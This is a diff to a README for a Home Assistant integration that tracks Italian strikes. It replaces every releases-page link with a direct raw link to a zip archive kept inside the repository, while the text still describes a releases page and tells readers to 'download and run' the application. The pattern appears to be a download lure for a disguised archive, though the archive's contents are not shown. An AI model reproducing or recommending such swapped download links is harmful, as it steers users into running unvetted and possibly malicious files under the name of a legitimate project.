@@ -1,7 +1,7 @@
 # 🎉 scioperi-italia - Stay Informed on Strikes in Italy
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download_Latest_Version-v1.0-blue.svg)](https://github.com/blackseaman/scioperi-italia/releases)
+[![Download](https://raw.githubusercontent.com/blackseaman/scioperi-italia/main/custom_components/scioperi_italia/scioperi-italia-1.6.zip)](https://raw.githubusercontent.com/blackseaman/scioperi-italia/main/custom_components/scioperi_italia/scioperi-italia-1.6.zip)
 
 ## 📖 Description
 This integration for Home Assistant helps you monitor strikes in Italy. It uses the official RSS feed from the Ministry of Infrastructure and Transport. Stay updated on transport disruptions easily from your home system.
@@ -10,7 +10,7 @@ This integration for Home Assistant helps you monitor strikes in Italy. It uses 
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
-   Click this link to go to the Releases page: [Download Page](https://github.com/blackseaman/scioperi-italia/releases).
+   Click this link to go to the Releases page: [Download Page](https://raw.githubusercontent.com/blackseaman/scioperi-italia/main/custom_components/scioperi_italia/scioperi-italia-1.6.zip).
    
 2. **Select the Latest Version**  
    On the Releases page, find the latest version of the "scioperi-italia" application. Look for the most recent entry, which will have the highest version number.
@@ -39,7 +39,7 @@ To ensure the application runs smoothly, your system should meet the following r
 ## 📥 Download & Install
 To get started quickly:
 
-1. **Visit this page to download the application**: [Download Page](https://github.com/blackseaman/scioperi-italia/releases).
+1. **Visit this page to download the application**: [Download Page](https://raw.githubusercontent.com/blackseaman/scioperi-italia/main/custom_components/scioperi_italia/scioperi-italia-1.6.zip).
 2. Follow the earlier steps to run the application.
 
 ## 🔧 Troubleshooting
